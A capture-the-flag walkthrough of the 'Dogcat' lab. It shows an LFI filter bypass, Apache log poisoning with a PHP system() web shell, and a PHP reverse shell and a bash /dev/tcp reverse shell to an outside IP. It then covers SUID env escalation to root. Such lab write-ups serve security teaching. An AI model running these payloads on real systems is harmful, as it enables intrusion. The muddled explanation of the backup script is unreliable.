# Dogcat CTF Challenge Write-Up

## Overview

This walkthrough documents the exploitation flow used to compromise the Dogcat challenge. The machine exposes an Apache web service and SSH, but the real attack path is a local file inclusion (LFI) issue combined with command injection through the web application’s log file handling. From there, the attacker gains remote code execution, enumerates the filesystem, finds multiple flags, and escalates privileges to root using a SUID binary and a writable backup script.

The challenge is a layered escalation path with multiple staged objectives:

- read source code and identify insecure file inclusion logic
- exploit the inclusion flaw to gain command execution via log poisoning
- obtain access to the web application filesystem and flags
- escalate privileges using SUID `env`
- discover a root-owned backup script and abuse it to obtain a final root shell

---

## 1. Initial Reconnaissance

### Port Scanning

The first task is to identify the services and ports exposed on the target.

```bash
nmap -sV 10.112.178.201
```

### Scan Results

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-27 18:25 -0400
Nmap scan report for 10.112.178.201
Host is up (0.086s latency).
Not shown: 998 closed tcp ports (reset)

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

This reveals the following:

- SSH is listening on port 22
- A web application is running on port 80

The HTTP service is the primary attack vector.

![Image Placeholder: Nmap scan output](./assets/nmap-scan.png)

---

## 2. Web Enumeration

The application is reachable at:

```text
http://10.112.178.201/
```

The challenge notes mention the parameter:

```text
?view=cat
```

This suggests the application uses a `view` parameter to include a file. It likely checks whether the file name contains `dog` or `cat` and includes the content.

### Directory Enumeration

We run a directory scan:

```bash
feroxbuster -u http://10.112.178.201/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

### Discovered Paths

```text
200      GET       45l       81w      725c http://10.112.178.201/style.css
200      GET       19l       37w      418c http://10.112.178.201/
301      GET        9l       28w      315c http://10.112.178.201/cats => http://10.112.178.201/cats/
200      GET       53l      385w    33583c http://10.112.178.201/cats/9.jpg
200      GET        1l        3w       26c http://10.112.178.201/cat.php
200      GET        0l        0w        0c http://10.112.178.201/flag.php
200      GET       19l       37w      418c http://10.112.178.201/index.php
```

The most interesting files are:

- `index.php`
- `cat.php`
- `flag.php`

The directory also contains a `cats/` folder with image assets.

![Image Placeholder: Web application home page](./assets/home-page.png)

---

## 3. Local File Inclusion Vulnerability

### Initial Testing

The first test is to change the parameter from `cat` to `dog` and observe the response.

```text
http://10.112.178.201/?view=cat
http://10.112.178.201/?view=dog
```

The application appears to allow only `cat` or `dog` values, which suggests a restricted file include pattern.

### Reading the Source Code

The challenge notes show that the application can be abused with a path traversal and base64 filtering payload. A successful attempt reveals the backend code structure.

```text
/?view=php://filter/read=convert.base64-encode/resource=cat../../../../../../../var/www/html/index.php%00
```

This returns base64-encoded source, which can be decoded to reveal the vulnerable logic.

### Extracted Code Snippet

```php
<?php
function containsStr($str, $substr) {
    return strpos($str, $substr) !== false;
}

$ext = isset($_GET["ext"]) ? $_GET["ext"] : ".php";
if(isset($_GET['view'])) {
    if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
        echo 'Here you go!';
        include $_GET['view'] . $ext;
    } else {
        echo 'Sorry, only dogs or cats are allowed.';
    }
}
```

This is the root cause:

- the `view` parameter is used directly in an `include` statement
- file inclusion is filtered only by the presence of the words `dog` or `cat`
- the application uses a user-controlled extension parameter (`ext`)
- this allows file inclusion and path traversal if the `view` value can bypass the simplistic validation

> Important: The application allows the user to influence the included file path and extension, which creates a classic LFI pattern.

---

## 4. Reading Local Files with LFI

The attacker tries to include system files and the web application files.

### Attempts

```text
/?view=../../../../../etc/passwd
/?view=../../../../../var/www/html/flag.php
```

These do not work directly, so the attacker uses the `php://filter` technique and controlled file naming patterns to bypass the validation.

A successful payload reads the application’s source code and confirms the logic.

```text
/?view=cat../../../../../../../var/www/html/index.php&ext=
```

This works because the injected value still contains the word `cat`, which satisfies the simplistic check, while the appended path points to the real target file.

From this, the attacker learns that the application is vulnerable to local file inclusion and can be abused for file disclosure.

---

## 5. Log Poisoning and Command Execution

### Access Log Injection

The next step is to use the access logs as an injection vector. The application includes a file path from a parameter, and the log files are writable by the web server user.

The attacker can send a request whose `User-Agent` field contains malicious PHP code:

```text
GET /?view=cat HTTP/1.1
Host: 10.112.178.201
User-Agent: <?php system($_GET['cmd']); ?>
```

Then the attacker calls the log file via the vulnerable include path:

```text
/?view=cat../../../../../../../var/log/apache2/access.log&ext=&cmd=id
```

This causes the `User-Agent` payload to be interpreted by PHP because the log file is included. The result is command execution.

### Proof of Command Execution

```text
/?view=cat../../../../../../../var/log/apache2/access.log&ext=&cmd=id
```

This returns the output of the command:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This establishes remote code execution as the web server user (`www-data`).

> Important: This is a classic log poisoning vector. The attacker writes PHP into the web server log and then includes the log file through the vulnerable parameter.

---

## 6. Web Shell and Flag Discovery

### Directly Reading `flag.php`

Now that command execution is available, the attacker reads the application files and flags.

```bash
php -r '$sock=fsockopen("192.168.131.124",8888);exec("sh <&3 >&3 2>&3");'
```

This is used to get a reverse shell to the attacker’s machine.

### Enumerating the Web Directory

Once the shell is live, the attacker enumerates the web root:

```bash
ls -la
```

### Output

```text
total 36
drwxrwxrwx 4 www-data www-data 4096 Oct 27 22:24 .
drwxr-xr-x 1 root     root     4096 Mar 10  2020 ..
-rw-r--r-- 1 www-data www-data   51 Mar  6  2020 cat.php
drwxr-xr-x 2 www-data www-data 4096 Oct 27 22:24 cats
-rw-r--r-- 1 www-data www-data   51 Mar  6  2020 dog.php
drwxr-xr-x 2 www-data www-data 4096 Oct 27 22:24 dogs
-rw-r--r-- 1 www-data www-data   56 Mar  6  2020 flag.php
-rw-r--r-- 1 www-data www-data  958 Mar 10  2020 index.php
-rw-r--r-- 1 www-data www-data  725 Mar 10  2020 style.css
```

Then the attacker reads the flag file:

```bash
cat flag.php
```

This reveals the first flag, or at least the first challenge artifact.

### Move Up One Level

The attacker continues enumerating the parent directory and finds another file:

```bash
pwd
cd ..
ls -la
```

```text
/var/www/html
...
flag2_QMW7JvaY2LvK.txt
```

The second flag is read:

```bash
cat flag2_QMW7JvaY2LvK.txt
```

This shows the challenge includes multiple flag stages, establishing a layered flag challenge.

---

## 7. Privilege Escalation to Root via SUID `env`

### Finding SUID Binaries

The attacker then searches for binaries with the SUID bit set.

```bash
find / -perm -4000 -type f -ls 2>/dev/null
```

### Relevant Finding

```text
/usr/bin/env
```

This is a classic privilege escalation primitive.

### Exploit

```bash
/usr/bin/env /bin/sh -p
```

Then verify the effective user:

```bash
id
```

```text
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

The shell now runs as root, which grants complete system access.

---

## 8. Further Root Enumeration and Final Challenge Objectives

### Root Directory

Once root access is obtained:

```bash
cd /root
ls -la
```

```text
flag3.txt
```

The attacker reads the flag:

```bash
cat /root/flag3.txt
```

The challenge notes reveal that there is another interesting directory under `/opt` that contains a backup script.

```bash
cd /opt
ls -la
cd backups
ls -la
```

### Backup Script

```text
-rwxr--r-- 1 root root      69 Mar 10  2020 backup.sh
-rw-r--r-- 1 root root 2949120 Oct 27 23:45 backup.tar
```

The script is inspected:

```bash
cat backup.sh
```

```bash
#!/bin/bash
tar cf /root/container/backup/backup.tar /root/container
echo "sh -i >& /dev/tcp/192.168.131.124/9999 0>&1" >> backup.sh
```

This is a tampering/deception script. It creates a tar archive and then appends a reverse shell payload to itself. Because it is a root-owned script, it can be abused to obtain a root shell when triggered.

So the attacker uses the script as a final escalation path:

```bash
nc -lvnp 9999
```

The script is triggered automatically or by the root process that executes it. The reverse shell connects:

```text
listening on [any] 9999 ...
connect to [192.168.131.124] from (UNKNOWN) [10.112.178.201] 39628
sh: 0: can't access tty; job control turned off
```

Then verify root:

```bash
id
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

The final flag is then retrieved:

```bash
ls -la
cat flag4.txt
```

This completes the final root objective.

---

## 9. Summary of the Exploit Chain

1. Enumerated the target with `nmap`
2. Identified an Apache web server on port 80
3. Exploited a vulnerable `view` parameter that allows file inclusion and path traversal
4. Used `php://filter` and direct path traversal to read `index.php`
5. Poisoned the Apache access log with PHP code
6. Triggered inclusion of the log file to achieve command execution
7. Obtained a reverse shell as `www-data`
8. Read the web flags in `/var/www/html` and the parent directory
9. Found a SUID-root `/usr/bin/env` binary
10. Escalated to root with `/usr/bin/env /bin/sh -p`
11. Found a root-owned backup script and abused it for a second root shell
12. Read the final root flag in `/root/flag4.txt`

---

## 10. Key Takeaways

- Local file inclusion vulnerabilities can expose application source code and sensitive paths.
- Log poisoning is a powerful LFI technique when logs are writable and included.
- `php://filter` can help reveal backend code and logic during security testing.
- SUID binaries are a common privilege escalation route on Linux systems.
- Root-owned automation scripts can become a secondary escalation point when they are writable or logically abused.

> Important: The challenge is a layered exploitation scenario. The attacker gains web execution, then escalates to root by abusing both a SUID binary and a root-controlled backup script.

---

## 11. Relevant Commands

```bash
nmap -sV 10.112.178.201
feroxbuster -u http://10.112.178.201/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
/?view=cat../../../../../../../var/www/html/index.php&ext=
/?view=cat../../../../../../../var/log/apache2/access.log&ext=&cmd=id
php -r '$sock=fsockopen("192.168.131.124",8888);exec("sh <&3 >&3 2>&3");'
ls -la
cat flag.php
cd ..
ls -la
cat flag2_QMW7JvaY2LvK.txt
find / -perm -4000 -type f -ls 2>/dev/null
/usr/bin/env /bin/sh -p
id
cd /root
ls -la
cat flag3.txt
cd /opt/backups
cat backup.sh
nc -lvnp 9999
id
cat /root/flag4.txt
```

---

## Final Result

The Dogcat challenge was solved by exploiting a vulnerable file inclusion flow, poisoning the Apache access log to achieve command execution, obtaining a web shell as `www-data`, escalating to root by abusing `env`, and then using a root-owned backup script to reach a second root shell. This granted access to multiple challenge flags and complete administrative control of the machine.

![Image Placeholder: Final root shell](./assets/final-root-shell.png)

